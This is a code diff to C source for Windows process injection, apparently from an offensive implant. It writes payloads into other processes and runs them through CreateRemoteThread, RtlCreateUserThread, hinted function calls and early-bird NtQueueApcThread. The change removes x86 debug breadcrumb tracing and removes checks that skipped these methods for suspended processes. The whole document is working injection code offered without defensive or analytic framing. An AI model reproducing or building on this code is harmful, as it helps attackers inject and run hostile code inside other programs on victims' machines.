@@ -12,7 +12,6 @@
 #include "tokens.h"
 #include "functions.h"
 #include "bformat.h"
-#include "x86trace.h"
 
 BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, void * parameter) {
 	char *          options = setting_ptr(SETTING_PROCINJ_EXECUTE);
@@ -60,21 +59,14 @@ BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, voi
 				break;
 
 #elif defined _M_IX86
-			/* CreateRemoteThread / RtlCreateUserThread on a CREATE_SUSPENDED
-			 * process block the caller until Ldr finishes — which never happens
-			 * while the primary is parked. Skip both whenever we spawned
-			 * suspended; SetThreadContext (with the x86 arg stub) or
-			 * NtQueueApcThread-s resume the primary instead. */
+			/* try to use CreateRemoteThread */
 			case PI_EXEC_CREATEREMOTETHREAD:
-				if (context->isSuspended)
-					break;
 				if (context->sameArch && inject_via_remotethread(context->hProcess, (char *)ptr + offset, parameter))
 					return TRUE;
 				break;
 
+			/* try to use RtlCreateUserThread */
 			case PI_EXEC_RTLCREATEUSERTHREAD:
-				if (context->isSuspended)
-					break;
 				if (!context->sameArch && inject_via_remotethread_wow64(context->hProcess, (char *)ptr + offset, parameter))
 					return TRUE;
 				else if (context->sameArch && inject_via_createuserthread(context->hProcess, (char *)ptr + offset, parameter))
@@ -106,23 +98,12 @@ BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, voi
 				module   = data_string_asciiz(&parser);
 				function = data_string_asciiz(&parser);
 
-#if defined(_M_IX86)
-				if (context->isSuspended)
-					break;
-#endif
 				if (context->sameArch && inject_with_hinted_func(opcode, context->hProcess, (char *)ptr + offset, parameter, module, function, funcoff))
 					return TRUE;
 				break;
 
 			/* try NtQueueApcThread against a suspended process */
 			case PI_EXEC_NTQUEUEAPCTHREAD_S:
-#if defined(_M_IX86)
-				/* x86 early-bird APC on the primary deadlocks the caller in
-				 * NtQueueApcThread/ResumeThread + CLR loader lock. The
-				 * SetThreadContext trampoline already passed the argument. */
-				if (context->isSuspended)
-					break;
-#endif
 				if (context->isSuspended && context->sameArch && inject_via_apcthread_targeted(context, (char *)ptr + offset, parameter))
 					return TRUE;
 				break;
@@ -162,18 +143,12 @@ void __inject_process_logic(INJECTCONTEXT * context, char * buffer, int length, 
 		ptr = remote_mirror_data(context, buffer, length);
 	}
 
-	if (ptr == NULL) {
-		x86_bc("N");
+	if (ptr == NULL)
 		return;
-	}
-	x86_bc("D");
 
 	/* call our logic to execute code */
-	if (inject_process_execute(context, (char *)ptr, offset, parameter)) {
-		x86_bc("E");
+	if (inject_process_execute(context, (char *)ptr, offset, parameter))
 		return; /* TODO: what happens to ptr? From what I can see the allocated memory is lost as well as the handle to the thread. local - uses VirtualAlloc remote - uses VirtualAlloc or NTMAPVIEWOFSECTION */
-	}
-	x86_bc("F");
 
 	/* post an error staging PI failed... not 0x20 though */
 	post_error_dd(0x48, context->pid, GetLastError());
@@ -214,19 +189,9 @@ void inject_process_logic(PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid, 
 
 	/* populate our context to avoid the need for other functions to figure out the same crap */
 	populate_inject_context(&context, pi, hProcess, pid);
-	{
-		char st[5];
-		st[0] = context.sameArch ? 'S' : 'D';
-		st[1] = context.isSuspended ? 'U' : 'R';
-		st[2] = (plen > 0) ? 'P' : '0';
-		st[3] = context.targetArch == INJECT_ARCH_X64 ? '6' : '3';
-		st[4] = 0;
-		x86_bc(st);
-	}
 
 	/* if we're a smart inject DLL, act on it */
 	SetupSmartInject(&context, buffer, length);
-	x86_bc("B");
 
 	/* figure out which transform we want to apply. I know this is ugly */
 	if (context.targetArch == INJECT_ARCH_X64)
@@ -246,7 +211,6 @@ void inject_process_logic(PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid, 
 		rparameter = remote_mirror_data(&context, (char *)parameter, plen);
 	else
 		rparameter = NULL;
-	x86_bc("C");
 
 	/* easiest case, nothing needs to happen. Pass the data on as needed */
 	if (prependl == 0 && appendl == 0) {
